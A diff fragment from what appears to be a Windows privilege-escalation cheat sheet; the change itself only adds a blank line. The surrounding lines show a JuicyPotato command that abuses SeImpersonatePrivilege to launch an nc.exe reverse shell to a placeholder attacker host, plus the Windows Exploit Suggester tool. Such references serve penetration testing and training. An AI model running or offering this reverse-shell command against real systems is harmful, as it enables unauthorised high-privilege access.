@@ -579,6 +579,7 @@ SeImpersonatePrivilege (JuicyPotato.exe)
 .\JuicyPotato.exe -t * -p C:\Windows\System32\cmd.exe -l 1337 -a "/c C:\PATH\TO\nc.exe -e C:\Windows\System32\cmd.exe ATTACKER_IP ATTACKER_PORT"
 ```
 Windows Exploit Sugester [Github](https://raw.githubusercontent.com/AonCyberLabs/Windows-Exploit-Suggester/master/windows-exploit-suggester.py)
+
 Download Database
 ```
 python2 windows-exploit-suggester.py -u
